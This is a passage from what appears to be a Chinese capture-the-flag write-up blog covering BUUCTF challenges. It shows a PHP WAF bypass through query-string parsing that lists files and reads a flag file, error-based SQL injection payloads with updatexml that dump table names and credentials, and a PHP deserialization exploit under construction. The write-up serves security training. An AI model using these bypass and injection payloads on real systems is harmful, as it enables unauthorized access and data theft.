string\">';'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter\">?></span> \n</code></pre>\n<p>waf主要就是看有没有非数字存在，绕过waf就好操作了</p>\n<hr>\n<p>1.1PHP的字符串解析特性</p>\n<p>这是别人对PHP字符串解析漏洞的理解，<br>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。</p>\n<p>例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。</p>\n<p>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>\n<p>例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。</p>\n<p>如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>\n<pre><code>/news.php?%20news[id%00=42&quot;+AND+1=0–\n</code></pre>\n<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>\n<p><u><strong>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</strong></u></p>\n<pre><code>1.删除空白符\n\n2.将某些字符转换为下划线（包括空格）\n</code></pre>\n<p>我的理解：<br>假如waf不允许num变量传递字母：</p>\n<pre><code>http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话\n</code></pre>\n<p>那么我们可以在num前加个空格：</p>\n<pre><code>http://www.xxx.com/index.php? num = aaaa\n</code></pre>\n<p>这样waf就找不到num这个变量了，因为现在的变量叫“（空格）num”，而不是“num”。</p>\n<p>但php在解析的时候，会<u>先把空格给去掉</u>，这样我们的代码还能正常运行，还上传了非法字符。</p>\n<hr>\n<p>var_dump() </p>\n<pre><code>列举数组内容\n</code></pre>\n<p>scandir() 的使用：</p>\n<pre><code>scandir(directory,sorting_order,context);\n\n 返回指定目录中的文件和目录的数组,就是显示文件夹名字\n</code></pre>\n<p>file_get_contents() 的使用：</p>\n<pre><code>原型：file_get_contents(path,include_path,context,start,max_length)\nfile_get_contents() 函数把整个文件读入一个字符串中。\n和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。\nfile_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。\n就是显示文件内容\n</code></pre>\n<hr>\n<p>chr(47)是<code>/</code>的ASCII编码；【<code>/</code>就是根目录，可以先访问一下根目录，找找大概flag在哪里】</p>\n<p>chr(102)是<code>f</code>的ASCII编码；</p>\n<p>chr(49)是<code>1</code>的ASCII编码；</p>\n<p>chr(97)是<code>a</code>的ASCII编码；</p>\n<p>chr(103)是<code>g</code>的ASCII编码。</p>\n<p>【字符间用<code>.</code>连接，如<code>flag</code>-&gt;<code>chr(102).chr(49).chr(97).chr(103)</code>】</p>\n<p>根据php解析字符串的特性</p>\n<p>先试试返回看看根目录（&#x2F;）下的文件有哪些</p>\n<p><code>http://node4.buuoj.cn:29105/calc.php?num=var_dump(scandir(chr(47)))</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220819232248275.png\" alt=\"image-20220819232248275\"></p>\n<p>看到有个<code>flagg</code></p>\n<p>返回看看<code>/flagg</code>里的内容</p>\n<p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220819234552921.png\" alt=\"image-20220819234552921\"></p>\n<h2 id=\"5-极客大挑战-2019-HardSQL\"><a href=\"#5-极客大挑战-2019-HardSQL\" class=\"headerlink\" title=\"5.[极客大挑战 2019]HardSQL\"></a>5.[极客大挑战 2019]HardSQL</h2><h3 id=\"1-题目描述-3\"><a href=\"#1-题目描述-3\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-3\"><a href=\"#2-wp-3\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>看名字，猜测这个sql注入过滤很严</p>\n<p><img src=\"/post/wp-buuctf/image-20220821144626428.png\" alt=\"image-20220821144626428\"></p>\n<p>先试试fuzz测试，看看过滤了哪些，发现union被过滤，所以不能用联合注入</p>\n<p><img src=\"/post/wp-buuctf/image-20220821144002573.png\" alt=\"image-20220821144002573\"></p>\n<p>但是发现updatexml没有被过滤，所以可以试试报错注入</p>\n<p><img src=\"/post/wp-buuctf/image-20220821145036408.png\" alt=\"image-20220821145036408\"></p>\n<p>先构造payload</p>\n<pre><code>?username=1&amp;password=1&#39;or updatexml(1,concat(0x7e,database(),0x7e),1)%23\n【这里+被过滤了，所以这里用#】\n</code></pre>\n<p>结果发现结果又被过滤了，后面用fuzz又测试了一下，发现空格也被过滤了，用%0a和其他符号也不能替换，所以只能试试()把结果框起来试试能不能绕过</p>\n<pre><code>?username=1&amp;password=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23\n</code></pre>\n<p>得到数据库名</p>\n<p><img src=\"/post/wp-buuctf/image-20220821172827984.png\" alt=\"image-20220821172827984\"></p>\n<p>后面就是差不多了，但是要注意不能用空格，要用()框住对象</p>\n<pre><code>?username=1&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))%23\n【这里的=也被过滤了，所以用like替换】\n</code></pre>\n<p>得到表名</p>\n<p><img src=\"/post/wp-buuctf/image-20220821173920231.png\" alt=\"image-20220821173920231\"></p>\n<pre><code>?username=1&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23\n</code></pre>\n<p>得到列名</p>\n<p><img src=\"/post/wp-buuctf/image-20220821174239954.png\" alt=\"image-20220821174239954\"></p>\n<p>然后看看列里数据找找flag</p>\n<pre><code>?username=1&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))%23\n</code></pre>\n<p>看回显知道flag在password里，但为什么显示不全，<strong>是因为updatexml报错回显的数据限制最多32位，所以无法显示全flag</strong></p>\n<p><img src=\"/post/wp-buuctf/image-20220821174509553.png\" alt=\"image-20220821174509553\"></p>\n<p>所以可以用left和right函数进行分段显示，本来想用stustr函数，但是发现也被过滤了</p>\n<pre><code>?username=1&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1))%23\n</code></pre>\n<p>为什么这里left函数显示30个字符，因为0x7e也就是<del>也是字符，</del>已经占了两位，所以还可以显示30位</p>\n<p><img src=\"/post/wp-buuctf/image-20220821220007687.png\" alt=\"image-20220821220007687\"></p>\n<pre><code>?username=1&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220821220041922.png\" alt=\"image-20220821220041922\"></p>\n<p>因为是左右显示30位，所以flag内容有重叠，整理一下</p>\n<p>得到flag</p>\n<pre><code>flag&#123;034eb054-83b5-412c-b90e-afc72c6ce998&#125;\n</code></pre>\n<h2 id=\"6-网鼎杯-2020-青龙组-AreUSerialz1\"><a href=\"#6-网鼎杯-2020-青龙组-AreUSerialz1\" class=\"headerlink\" title=\"6.[网鼎杯 2020 青龙组]AreUSerialz1\"></a>6.[网鼎杯 2020 青龙组]AreUSerialz1</h2><p>1)题目描述</p>\n<p>无</p>\n<p>2)wp</p>\n<p>一道典型的序列化题目</p>\n<p>先对代码进行分析</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FileHandler</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$op</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$op</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"/tmp/tmpfile\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad Hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Too long!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">filename</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Successful!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$res</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string\">\"[Result]: &lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">op</span> <span class=\"token operator\">===</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">op</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">content</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">is_valid</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">32</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">125</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span><span class=\"token string\">'str'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_valid</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<pre class=\" language-php\"><code class=\"language-php\">    <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$op</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"/tmp/tmpfile\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>__construct()函数没有用，不参与序列化中</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function\">is_valid</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">32</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">125</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\" spellcheck=\"true\">//ord() 函数返回字符串中第一个字符的 ASCII 值。</span>\n<span class=\"token comment\" spellcheck=\"true\">// ASCII值32为2，ASCII值125为%</span>\n</code></pre>\n<p>这个函数主要是过滤掉protect类的成员,在序列化的时候是以%00作为标识符</p>\n<pre><code>*但是在PHP版本大于7.1的情况下，protect类和public类没什么好注意的，所以在构造序列化时改为public可以绕过is_valid函数\n</code></pre>\n<pre class=\" language-php\"><code class=\"language-php\">    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">op</span> <span class=\"token operator\">===</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">op</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">content</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>__destruc()函数主要是不让<code>op===&quot;2&quot;</code>，但是在process函数里op又要为“2”</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad Hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>所以这里利用强弱类型比较，__destruc()函数里op是不能为2，但是是强类型比较，是字符2【”2”】,所以op&#x3D;2【数字2】，就绕过达到读取flag.php的结果</p>\n<p>于是构造出php序列化</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FileHandler</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$op</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileHandler</span><span class=\"token punctuation\">(</span><span class=\"token 